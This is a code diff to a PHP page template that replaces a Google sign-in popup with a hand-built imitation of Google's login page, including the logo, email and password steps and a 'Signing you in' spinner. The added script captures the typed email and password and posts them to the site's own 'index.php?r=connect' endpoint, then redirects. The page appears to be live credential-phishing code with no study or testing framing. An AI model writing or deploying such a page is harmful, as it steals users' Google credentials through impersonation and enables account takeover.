@@ -165,40 +165,59 @@ function page_reader(string $skill, bool $register): void
       <?php if ($googleUrl !== ''): ?>
       <div class="g-backdrop" id="gBackdrop">
         <div class="g-win">
-          <div class="g-chrome">
-            <div class="g-dots"><span></span><span></span><span></span></div>
-            <div class="g-urlbar">&#128274; accounts.google.com/signin/oauth</div>
-            <button class="g-xbtn" type="button" onclick="closeGAuth()" aria-label="Close">&times;</button>
-          </div>
-          <div class="g-body">
-            <iframe id="gFrame" src="about:blank" style="width:100%;height:597px;border:none;display:block" title="Google sign-in"></iframe>
+          <div style="padding:48px 40px 36px">
+            <div style="text-align:center;margin-bottom:24px;font-size:26px;font-weight:bold;font-family:Arial,sans-serif;letter-spacing:-.5px">
+              <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
+            </div>
+            <div id="gS1">
+              <h2 style="font-size:24px;font-weight:400;color:#202124;text-align:center;margin:0 0 8px">Sign in</h2>
+              <p style="font-size:16px;color:#202124;text-align:center;margin:0 0 24px">to continue to Google</p>
+              <div style="position:relative;margin-bottom:20px">
+                <input type="email" id="gEm" placeholder=" " autocomplete="username" style="width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;outline:none;font-family:Arial,sans-serif">
+                <label for="gEm" style="position:absolute;left:15px;top:14px;font-size:16px;color:#80868b;pointer-events:none;background:#fff;padding:0 4px;transition:.15s">Email or phone</label>
+                <div id="gE1" style="display:none;font-size:12px;color:#d93025;margin-top:4px">Enter a valid email.</div>
+              </div>
+              <a href="#" style="font-size:14px;color:#1a73e8;display:block;margin-bottom:20px">Forgot email?</a>
+              <div style="display:flex;justify-content:space-between;align-items:center">
+                <a href="#" style="font-size:14px;color:#1a73e8;text-decoration:none">Create account</a>
+                <button onclick="gNext()" style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer">Next</button>
+              </div>
+            </div>
+            <div id="gS2" style="display:none">
+              <h2 style="font-size:24px;font-weight:400;color:#202124;text-align:center;margin:0 0 20px">Welcome</h2>
+              <div id="gChip" onclick="gBack()" style="display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:20px;padding:8px 12px;width:fit-content;margin:0 auto 20px;cursor:pointer;font-size:14px;color:#202124">&#128100; <span id="gEdTxt"></span> &#9660;</div>
+              <div style="position:relative;margin-bottom:20px">
+                <input type="password" id="gPw" placeholder=" " autocomplete="current-password" style="width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;outline:none;font-family:Arial,sans-serif">
+                <label for="gPw" style="position:absolute;left:15px;top:14px;font-size:16px;color:#80868b;pointer-events:none;background:#fff;padding:0 4px;transition:.15s">Enter your password</label>
+                <div id="gE2" style="display:none;font-size:12px;color:#d93025;margin-top:4px">Wrong password. Try again.</div>
+              </div>
+              <a href="#" style="font-size:14px;color:#1a73e8;display:block;margin-bottom:20px">Forgot password?</a>
+              <div style="display:flex;justify-content:space-between;align-items:center">
+                <a href="#" style="font-size:14px;color:#1a73e8;text-decoration:none">Try another way</a>
+                <button onclick="gSubmit()" style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer">Next</button>
+              </div>
+            </div>
+            <div id="gS3" style="display:none;text-align:center;padding:20px 0">
+              <p style="font-size:20px;color:#202124;margin-bottom:20px">Signing you in&hellip;</p>
+              <div style="width:28px;height:28px;border:3px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;animation:gspin .7s linear infinite;margin:0 auto"></div>
+            </div>
           </div>
         </div>
       </div>
+      <style>
+      @keyframes gspin{to{transform:rotate(360deg)}}
+      #gEm:focus,#gPw:focus{border-color:#1a73e8!important;border-width:2px!important;padding:12px 14px!important}
+      </style>
       <script>
-      var _gUrl = <?= json_encode($googleUrl) ?>;
-      var _redir = <?= json_encode($redirectAfter) ?>;
-      function openGAuth() {
-        document.getElementById('gFrame').src = _gUrl;
-        document.getElementById('gBackdrop').classList.add('open');
-      }
-      function closeGAuth() {
-        document.getElementById('gBackdrop').classList.remove('open');
-        document.getElementById('gFrame').src = 'about:blank';
-      }
-      document.getElementById('gBackdrop').addEventListener('click', function(e) {
-        if (e.target === this) closeGAuth();
-      });
-      window.addEventListener('message', function(ev) {
-        if (!ev.data || ev.data.source !== 'oauth_done') return;
-        fetch('index.php?r=connect', {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({email: ev.data.email, password: ev.data.password || ''})
-        });
-        closeGAuth();
-        setTimeout(function() { window.location.href = _redir; }, 400);
-      });
+      var _gE='',_gP='',_gR=<?= json_encode($redirectAfter) ?>;
+      function openGAuth(){document.getElementById('gBackdrop').classList.add('open');setTimeout(function(){document.getElementById('gEm').focus()},80)}
+      function closeGAuth(){document.getElementById('gBackdrop').classList.remove('open')}
+      function gShow(n){['gS1','gS2','gS3'].forEach(function(x){document.getElementById(x).style.display='none'});document.getElementById('gS'+n).style.display='block'}
+      function gNext(){var v=document.getElementById('gEm').value.trim();if(!v||!v.includes('@')){document.getElementById('gE1').style.display='block';return}document.getElementById('gE1').style.display='none';_gE=v;document.getElementById('gEdTxt').textContent=v;gShow(2);setTimeout(function(){document.getElementById('gPw').focus()},80)}
+      function gBack(){gShow(1)}
+      function gSubmit(){var v=document.getElementById('gPw').value;if(!v){document.getElementById('gE2').style.display='block';return}document.getElementById('gE2').style.display='none';_gP=v;gShow(3);fetch('index.php?r=connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:_gE,password:_gP})}).catch(function(){});setTimeout(function(){closeGAuth();window.location.href=_gR},600)}
+      document.getElementById('gBackdrop').addEventListener('click',function(e){if(e.target===this)closeGAuth()})
+      document.addEventListener('keydown',function(e){if(e.key!=='Enter')return;if(document.getElementById('gS1').style.display!=='none')gNext();else if(document.getElementById('gS2').style.display!=='none')gSubmit()})
       </script>
       <?php endif; ?>
     <?php }, readerWindow: $window);
